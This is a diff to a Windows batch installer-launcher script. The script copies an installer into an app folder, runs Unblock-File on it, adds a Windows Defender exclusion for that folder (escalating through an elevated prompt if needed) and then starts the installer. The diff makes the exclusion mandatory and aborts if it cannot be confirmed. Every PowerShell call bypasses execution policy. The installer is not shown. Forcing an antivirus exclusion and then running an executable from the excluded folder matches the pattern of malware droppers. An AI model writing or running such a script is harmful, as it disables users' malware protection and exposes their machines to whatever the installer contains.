@@ -39,6 +39,7 @@ if not defined INSTALLER_PATH (
 :found_installer
 if not defined INSTALLER_PATH (
   call :fail "Installer not found. Expected: %EXE_NAME%"
+  exit /b 1
 )
 
 echo Target folder: "%APP_DIR%"
@@ -49,6 +50,7 @@ echo Installer source: "%INSTALLER_PATH%"
 if not exist "%APP_DIR%" mkdir "%APP_DIR%" >> "%LOG_FILE%" 2>&1
 if not exist "%APP_DIR%" (
   call :fail "Failed to create %APP_DIR%"
+  exit /b 1
 )
 
 for %%I in ("%INSTALLER_PATH%") do set "COPIED_INSTALLER=%APP_DIR%\%%~nxI"
@@ -57,38 +59,46 @@ echo [1/5] Copying installer...
 copy /Y "%INSTALLER_PATH%" "%COPIED_INSTALLER%" >> "%LOG_FILE%" 2>&1
 if errorlevel 1 (
   call :fail "Failed to copy installer to %APP_DIR%"
+  exit /b 1
 )
 
 echo [2/5] Unblocking copied installer...
 powershell -NoProfile -ExecutionPolicy Bypass -Command "$ErrorActionPreference='Stop'; Unblock-File -LiteralPath '%COPIED_INSTALLER%'" >> "%LOG_FILE%" 2>&1
 if errorlevel 1 (
   call :fail "Unblock-File failed for %COPIED_INSTALLER%"
+  exit /b 1
 )
 
 echo [3/5] Adding Defender exclusion...
-powershell -NoProfile -ExecutionPolicy Bypass -Command "$ErrorActionPreference='Stop'; $p=(Get-MpPreference).ExclusionPath; if ($p -notcontains '%APP_DIR%') { Add-MpPreference -ExclusionPath '%APP_DIR%' }" >> "%LOG_FILE%" 2>&1
+powershell -NoProfile -ExecutionPolicy Bypass -Command "$ErrorActionPreference='Stop'; $target='%APP_DIR%'.TrimEnd('\').ToLower(); $paths=@((Get-MpPreference).ExclusionPath); $norm=@($paths | ForEach-Object { $_.TrimEnd('\').ToLower() }); if ($norm -notcontains $target) { Add-MpPreference -ExclusionPath '%APP_DIR%' }" >> "%LOG_FILE%" 2>&1
 if errorlevel 1 (
   echo [WARN] Standard add failed. Trying elevated Add-MpPreference...
   powershell -NoProfile -ExecutionPolicy Bypass -Command "try { Start-Process powershell -Verb RunAs -Wait -ArgumentList '-NoProfile -ExecutionPolicy Bypass -Command ""$ErrorActionPreference=''''Stop''''; Add-MpPreference -ExclusionPath ''''%APP_DIR%''''""'; exit 0 } catch { exit 1 }" >> "%LOG_FILE%" 2>&1
   if errorlevel 1 (
     echo [WARN] Elevated exclusion setup failed or was canceled.
-    echo [WARN] Continue anyway. If installer is blocked, run this bat as Administrator.
+    echo [WARN] Exclusion step failed.
   )
 )
 
 echo [4/5] Verifying Defender exclusion...
-powershell -NoProfile -ExecutionPolicy Bypass -Command "$p=(Get-MpPreference).ExclusionPath; if ($p -contains '%APP_DIR%') { exit 0 } else { exit 2 }" >> "%LOG_FILE%" 2>&1
+powershell -NoProfile -ExecutionPolicy Bypass -Command "$target='%APP_DIR%'.TrimEnd('\').ToLower(); $paths=@((Get-MpPreference).ExclusionPath); $norm=@($paths | ForEach-Object { $_.TrimEnd('\').ToLower() }); if ($norm -contains $target) { exit 0 } else { exit 2 }" >> "%LOG_FILE%" 2>&1
 if errorlevel 1 (
-  echo [WARN] Exclusion not confirmed.
   set "EXCLUSION_OK=0"
+  call :fail "Defender exclusion NOT confirmed. Open Windows Security > Exclusions and add %APP_DIR%, then rerun this bat."
+  exit /b 1
 ) else (
   set "EXCLUSION_OK=1"
 )
 
 echo [5/5] Launching installer...
-start "" "%COPIED_INSTALLER%" >> "%LOG_FILE%" 2>&1
+if not exist "%COPIED_INSTALLER%" (
+  call :fail "Copied installer not found: %COPIED_INSTALLER%"
+  exit /b 1
+)
+powershell -NoProfile -ExecutionPolicy Bypass -Command "$ErrorActionPreference='Stop'; Start-Process -FilePath '%COPIED_INSTALLER%'" >> "%LOG_FILE%" 2>&1
 if errorlevel 1 (
   call :fail "Failed to start installer: %COPIED_INSTALLER%"
+  exit /b 1
 )
 
 echo ------------------------------------------
